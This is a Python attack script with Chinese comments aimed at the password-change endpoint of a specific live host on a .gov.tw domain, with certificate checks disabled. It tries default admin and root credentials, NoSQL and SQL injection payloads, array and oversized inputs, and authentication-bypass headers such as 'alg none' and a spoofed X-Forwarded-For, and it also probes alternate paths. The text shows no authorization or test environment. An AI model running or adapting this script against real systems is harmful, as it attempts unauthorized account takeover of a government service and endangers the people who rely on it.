#!/usr/bin/env python3
"""Deep probe PUT /Users/changePassword - 唯一返回 403 业务错误的端点."""
import ssl
import json
import urllib.request
import urllib.error

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

BASE = "https://epcr.tpf.gov.tw:4004"

def probe(method, path, body=None, headers=None, timeout=10):
    url = BASE + path
    data = None
    h = {"User-Agent": "Mozilla/5.0", "Accept": "application/json"}
    if body is not None:
        data = json.dumps(body).encode("utf-8")
        h["Content-Type"] = "application/json"
    if headers:
        h.update(headers)
    req = urllib.request.Request(url, data=data, headers=h, method=method)
    try:
        with urllib.request.urlopen(req, timeout=timeout, context=ctx) as resp:
            body_bytes = resp.read()
            body_text = body_bytes.decode("utf-8", "replace")[:500]
            print(f"[{resp.status}] {method:6s} {path:<50s}  body={body_text!r}")
            return resp.status, body_bytes, dict(resp.headers)
    except urllib.error.HTTPError as e:
        body_bytes = e.read()
        body_text = body_bytes.decode("utf-8", "replace")[:500]
        print(f"[{e.code}] {method:6s} {path:<50s}  body={body_text!r}")
        return e.code, body_bytes, dict(e.headers)
    except Exception as e:
        print(f"[ERR] {method:6s} {path:<50s}  {type(e).__name__}: {e}")
        return None, None, None

print("=" * 100)
print("PUT /Users/changePassword - 不同 body 变体")
print("=" * 100)
variants = [
    # 1. 标准 ChangePasswordCtrl 字段
    {"account": "admin", "oldPassword": "admin", "newPassword": "Test1234", "newPasswordConfirmation": "Test1234"},
    {"account": "admin", "oldPassword": "admin", "newPassword": "Test1234"},
    {"account": "admin", "newPassword": "Test1234", "newPasswordConfirmation": "Test1234"},
    {"account": "admin", "oldPassword": "admin"},
    {"account": "admin"},
    {"username": "admin", "oldPassword": "admin", "newPassword": "Test1234", "newPasswordConfirmation": "Test1234"},
    # 2. 常见账户名
    {"account": "test", "oldPassword": "test", "newPassword": "Test1234", "newPasswordConfirmation": "Test1234"},
    {"account": "user", "oldPassword": "user", "newPassword": "Test1234", "newPasswordConfirmation": "Test1234"},
    {"account": "root", "oldPassword": "root", "newPassword": "Test1234", "newPasswordConfirmation": "Test1234"},
    {"account": "", "oldPassword": "", "newPassword": "", "newPasswordConfirmation": ""},
    {"account": None, "oldPassword": None, "newPassword": None, "newPasswordConfirmation": None},
    # 3. NoSQL 操作符注入
    {"account": {"$ne": "admin"}, "oldPassword": "admin", "newPassword": "Test1234", "newPasswordConfirmation": "Test1234"},
    {"account": "admin", "oldPassword": {"$ne": ""}, "newPassword": "Test1234", "newPasswordConfirmation": "Test1234"},
    {"account": "admin", "oldPassword": {"$gt": ""}, "newPassword": "Test1234", "newPasswordConfirmation": "Test1234"},
    {"account": "admin", "oldPassword": "admin", "newPassword": {"$ne": ""}, "newPasswordConfirmation": "Test1234"},
    # 4. 数组注入
    {"account": ["admin"], "oldPassword": "admin"},
    {"account": "admin", "oldPassword": ["admin"]},
    # 5. SQL injection 测试
    {"account": "admin' OR '1'='1", "oldPassword": "admin' OR '1'='1"},
    # 6. domain 字段测试（参考 AuthService login domain:'AUTH_SERVER'）
    {"account": "admin", "oldPassword": "admin", "newPassword": "Test1234", "newPasswordConfirmation": "Test1234", "domain": "AUTH_SERVER"},
    {"account": "admin", "oldPassword": "admin", "newPassword": "Test1234", "newPasswordConfirmation": "Test1234", "domain": "ECPR"},
    # 7. 空字符串 / null 边界
    {"account": "admin", "oldPassword": "", "newPassword": "Test1234", "newPasswordConfirmation": "Test1234"},
    {"account": "admin", "oldPassword": "admin", "newPassword": "", "newPasswordConfirmation": "Test1234"},
    {"account": "admin", "oldPassword": "admin", "newPassword": "Test1234", "newPasswordConfirmation": ""},
    {"account": "admin", "oldPassword": "admin", "newPassword": "Test1234", "newPasswordConfirmation": "test1234"},
    # 8. 仅有 account 字段
    {"account": "admin"},
    {"account": "test"},
    {"account": "user"},
    {"account": "support"},
    {"account": "operator"},
    {"account": "demo"},
    {"account": "guest"},
    # 9. 大字段
    {"account": "a"*1000, "oldPassword": "admin"},
    {"account": "admin", "oldPassword": "a"*1000},
]

for v in variants:
    probe("PUT", "/Users/changePassword", body=v)

print("\n" + "=" * 100)
print("PUT /Users/changePassword - 不同 Content-Type")
print("=" * 100)
# Form-urlencoded
data = "account=admin&oldPassword=admin&newPassword=Test1234&newPasswordConfirmation=Test1234"
req = urllib.request.Request(BASE + "/Users/changePassword", data=data.encode("utf-8"),
                              headers={"Content-Type": "application/x-www-form-urlencoded",
                                       "User-Agent": "Mozilla/5.0"}, method="PUT")
try:
    with urllib.request.urlopen(req, timeout=10, context=ctx) as resp:
        body = resp.read().decode("utf-8", "replace")[:300]
        print(f"[{resp.status}] PUT form-urlencoded: {body!r}")
except urllib.error.HTTPError as e:
    body = e.read().decode("utf-8", "replace")[:300]
    print(f"[{e.code}] PUT form-urlencoded: {body!r}")

# Multipart
import http.client
boundary = "----formdata-pentest-12345"
body = (
    f"--{boundary}\r\nContent-Disposition: form-data; name=\"account\"\r\n\r\nadmin\r\n"
    f"--{boundary}\r\nContent-Disposition: form-data; name=\"oldPassword\"\r\n\r\nadmin\r\n"
    f"--{boundary}\r\nContent-Disposition: form-data; name=\"newPassword\"\r\n\r\nTest1234\r\n"
    f"--{boundary}\r\nContent-Disposition: form-data; name=\"newPasswordConfirmation\"\r\n\r\nTest1234\r\n"
    f"--{boundary}--\r\n"
).encode("utf-8")
req = urllib.request.Request(BASE + "/Users/changePassword", data=body,
                              headers={"Content-Type": f"multipart/form-data; boundary={boundary}",
                                       "User-Agent": "Mozilla/5.0"}, method="PUT")
try:
    with urllib.request.urlopen(req, timeout=10, context=ctx) as resp:
        body = resp.read().decode("utf-8", "replace")[:300]
        print(f"[{resp.status}] PUT multipart: {body!r}")
except urllib.error.HTTPError as e:
    body = e.read().decode("utf-8", "replace")[:300]
    print(f"[{e.code}] PUT multipart: {body!r}")

print("\n" + "=" * 100)
print("PUT /Users/changePassword - HTTP Header Bypass 测试")
print("=" * 100)
bypass_headers = [
    {"Authorization": "Bearer"},
    {"Authorization": "Bearer "},
    {"Authorization": "null"},
    {"Authorization": "undefined"},
    {"Authorization": "true"},
    {"Authorization": '{"alg":"none"}'},
    {"Cookie": "connect.sid="},
    {"X-Forwarded-For": "127.0.0.1"},
    {"X-Original-URL": "/Users/changePassword"},
    {"X-Rewrite-URL": "/Users/changePassword"},
]
for hdr in bypass_headers:
    probe("PUT", "/Users/changePassword",
          body={"account": "admin", "oldPassword": "admin"},
          headers=hdr)

print("\n" + "=" * 100)
print("PUT /Users/changePassword - 路径变体")
print("=" * 100)
for p in [
    "/Users/changePassword",
    "/Users/changePassword/",
    "/user/changePassword",
    "/users/changePassword",
    "/user/changePassword/",
    "/Users/ChangePassword",
    "/api/Users/changePassword",
    "/api/v1/Users/changePassword",
    "/Users/change_password",
    "/Users/password",
    "/changePassword",
    "/password",
]:
    probe("PUT", p, body={"account": "admin", "oldPassword": "admin", "newPassword": "Test1234", "newPasswordConfirmation": "Test1234"})

print("\n" + "=" * 100)
print("PUT /Users/changePassword - 401 vs 403 状态码分析")
print("=" * 100)
# 检查 Options/Head
probe("OPTIONS", "/Users/changePassword")
probe("HEAD", "/Users/changePassword")

